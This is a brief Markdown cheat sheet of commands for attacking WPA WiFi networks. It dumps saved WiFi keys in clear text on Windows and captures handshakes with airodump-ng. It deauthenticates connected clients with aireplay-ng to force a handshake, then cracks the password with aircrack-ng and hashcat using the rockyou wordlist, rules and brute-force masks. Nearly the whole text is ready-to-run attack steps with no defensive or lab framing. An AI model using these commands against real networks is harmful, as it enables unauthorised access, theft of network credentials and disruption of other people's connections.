# CheatSheet Wifi

## Get Wifi key on windows : 
```
netsh.exe wlan show profiles name=’Profile Name’ key=clear
```

## Set your network interface into monitor mode
```
airmon-ng start wlan0
```

## Listen for all nearby beacon frames to get target BSSID and channel
```
airodump-ng mon0
```

## Listening for a handshake
```
airodump-ng -c 6 — bssid 9C:5C:8E:C9:AB:C0 -w capture/ mon0
```

## Deauth a connected client to force a handshake
```
aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0
```

## Crack password

Download some wordlist if needed, for example:

```
curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
```

- Crack with aircrack-ng

  ```
  aircrack-ng -a2 -b 9C:5C:8E:C9:AB:C0 -w rockyou.txt capture/-01.cap
  ```

- Convert cap to hccapx

  Use the hascat-utils with cap2hccapx.bin 

  ```
  cap2hccapx.bin capture/-01.cap capture/-01.hccapx
  ```

- Crack with naive-hashcat

  ```
  HASH_FILE=hackme.hccapx POT_FILE=hackme.pot HASH_TYPE=2500 ./naive-hashcat.sh
  ```

- Crack with Hashcat

  ```
  hashcat.exe -m 2500 -r rules/best64.rule capture.hccapx rockyou.txt
  hashcat.exe -m 2500 -a3 capture.hccapx ?d?d?d?d?d?d?d?d
  ```

  

